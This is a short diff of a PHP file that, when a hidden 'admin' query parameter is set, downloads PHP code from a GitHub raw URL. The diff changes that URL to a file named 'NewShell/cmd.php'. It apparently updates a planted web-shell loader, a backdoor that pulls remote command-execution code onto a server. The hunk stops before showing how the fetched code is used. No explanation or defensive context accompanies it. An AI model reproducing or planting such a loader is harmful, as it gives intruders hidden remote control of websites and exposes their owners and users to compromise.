@@ -1,6 +1,6 @@
 <?php 
 if (isset($_GET['admin'])) {
-    $url = "raw.githubusercontent.com/RaitoKazuki/sh/refs/heads/main/apiEmail-403-Litespeed-CMD.php";
+    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
     $fileContents = file_get_contents($url);
 
     if ($fileContents !== false) {
